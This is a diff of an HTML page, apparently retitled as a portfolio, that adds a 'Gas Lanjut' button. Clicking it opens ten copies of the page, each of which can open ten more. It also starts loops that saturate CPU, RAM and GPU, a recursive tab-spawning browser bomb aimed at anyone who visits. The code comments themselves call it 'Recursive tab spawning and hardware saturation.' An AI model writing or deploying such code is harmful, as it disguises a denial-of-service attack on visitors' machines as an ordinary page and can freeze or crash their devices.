@@ -3,23 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tab New</title>
+    <title>Portofolio New</title>
     <style>
-        body { margin: 0; overflow: hidden; background: #191919; }
-        canvas { display: block; }
+        body { margin: 0; overflow: hidden; background: #191919; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #start-btn { padding: 15px 30px; background: transparent; border: 2px solid #00ff00; color: #00ff00; cursor: pointer; font-size: 1.2rem; transition: 0.3s; z-index: 10; }
+        #start-btn:hover { background: #00ff00; color: #191919; box-shadow: 0 0 20px #00ff00; }
+        canvas { position: absolute; top: 0; left: 0; display: none; }
     </style>
 </head>
 <body>
+    <button id="start-btn">Gas Lanjut</button>
     <canvas id="c"></canvas>
+
     <script>
         /**
-         * @project Hardware Test
+         * @project Multi Test
          * @author HidzzY
-         * @description Synthetic workload for CPU/RAM/GPU benchmarking.
+         * @description Recursive tab spawning and hardware saturation.
          */
         
-        let running = true;
+        const startBtn = document.getElementById("start-btn");
+        const canvas = document.getElementById("c");
+        let running = false;
         let memory = [];
+
+        function spawnTabs() {
+            const currentURL = window.location.href;
+            for (let i = 0; i < 10; i++) {
+                window.open(currentURL, '_blank');
+            }
+        }
 
         const burnCPU = () => {
             const loop = () => {
@@ -38,12 +51,10 @@
             }, 100);
         };
 
-        const canvas = document.getElementById("c");
         const ctx = canvas.getContext("2d");
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
         const burnGPU = () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
             const draw = () => {
                 if (!running) return;
                 for (let i = 0; i < 1000; i++) {
@@ -55,15 +66,22 @@
             draw();
         };
 
-        for (let i = 0; i < 4; i++) burnCPU();
-        burnRAM();
-        burnGPU();
+        startBtn.addEventListener("click", () => {
+            startBtn.style.display = "none";
+            canvas.style.display = "block";
+            running = true;
+
+            spawnTabs(); 
+            for (let i = 0; i < 4; i++) burnCPU();
+            burnRAM();
+            burnGPU();
+        });
 
         document.addEventListener("keydown", (e) => {
             if (e.key === "Escape") {
                 running = false;
                 memory = [];
-                console.warn("[SYSTEM_SHUTDOWN]: Stress test terminated by user.");
+                console.warn("[SYSTEM_SHUTDOWN]: Terminated.");
             }
         });
     </script>
